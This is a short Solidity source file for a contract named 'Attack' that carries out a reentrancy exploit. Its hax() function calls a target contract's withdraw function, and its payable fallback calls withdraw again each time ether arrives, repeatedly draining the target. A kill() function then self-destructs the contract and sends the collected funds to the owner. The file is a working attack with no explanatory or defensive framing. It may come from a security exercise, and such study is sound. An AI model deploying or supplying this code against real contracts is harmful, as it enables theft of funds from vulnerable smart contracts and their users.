pragma solidity ^0.4.23;

contract Attack {
    address public target;
    address public owner;
    bytes4 public funcID = bytes4(keccak256("withdraw(uint256)"));
    uint256 public amount = 500000000000000000;
    
    constructor(address _target) public {
        target = _target;
        owner = msg.sender;
    }
    
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    
    function hax() public onlyOwner {
        address(target).call(funcID, amount);
    }
    
    function kill() public onlyOwner {
        selfdestruct(owner);
    }
    
    function balance() view public returns(uint256) {
        return address(this).balance;
    }
    
    function() payable public {
        address(target).call(funcID, amount);
    }
}
